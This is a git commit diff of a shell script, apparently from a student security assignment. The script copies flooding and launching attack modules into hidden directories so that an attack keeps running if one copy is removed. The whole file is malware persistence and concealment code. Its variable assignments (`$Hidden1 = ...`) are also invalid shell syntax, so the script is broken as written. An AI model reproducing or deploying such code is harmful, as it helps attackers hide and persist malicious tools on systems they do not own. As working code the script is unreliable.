5b00e255d870b90e8e4903ec1d9bdf61e5ef8c09
SongYun <william0228.cs05@g2.nctu.edu.tw>
2019-05-01 02:16:05 +0800

    add

--- qq.sh
+++ qq.sh
@@ -1,13 +1,13 @@
 # task2
 # replication attack file to two hidden files
 $Hidden1 = "../../.etc/.qq"
-mkdir $Hidden1
+mkdir "$Hidden1"
 cp ./Infect/Flooding_Attack $Hidden1
 cp ./Infect/Check_Attack $Hidden1
 cp ./Infect/Launching_Attack $Hidden1
 
 $Hidden2 = "../../.Launch_Attack"
-mkdir $Hidden2
+mkdir "$Hidden2"
 cp ./Infect/Launching_Attack $Hidden2
 
 # When one of attack modules is removed, the attack can still be launched by the other
